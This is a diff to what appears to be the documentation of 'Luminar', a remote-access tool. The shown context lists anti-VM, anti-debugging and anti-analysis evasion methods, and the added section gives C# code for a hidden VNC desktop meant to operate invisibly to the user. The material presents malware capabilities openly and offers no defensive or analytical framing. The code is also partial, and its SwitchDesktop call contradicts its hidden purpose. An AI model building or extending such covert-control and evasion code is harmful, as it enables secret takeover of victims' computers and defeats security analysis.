@@ -258,3 +258,25 @@ Luminar implements multiple layers of anti-detection:
 | Anti-VM | Memory timing checks, hardware ID verification | VMware, VirtualBox, QEMU |
 | Anti-Debug | IsDebuggerPresent, CheckRemoteDebuggerPresent, timing checks | User-mode debuggers |
 | Anti-Analysis | Code obfuscation, encrypted strings, delayed execution | Static analysis tools |
+
+### HVNC Implementation
+
+The Hidden VNC technology creates an invisible desktop session:
+
+```csharp
+protected override bool CreateHiddenDesktop()
+{
+    // Create a hidden desktop that's not visible to the user
+    _hiddenDesktop = CreateDesktop("HiddenDesktop", IntPtr.Zero, IntPtr.Zero, 0, DESKTOP_CREATEWINDOW | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP, IntPtr.Zero);
+    
+    if (_hiddenDesktop == IntPtr.Zero)
+        return false;
+        
+    // Switch to hidden desktop for operations
+    if (!SwitchDesktop(_hiddenDesktop))
+        return false;
+        
+    // Initialize hidden desktop environment
+    return InitializeHiddenEnvironment();
+}
+```
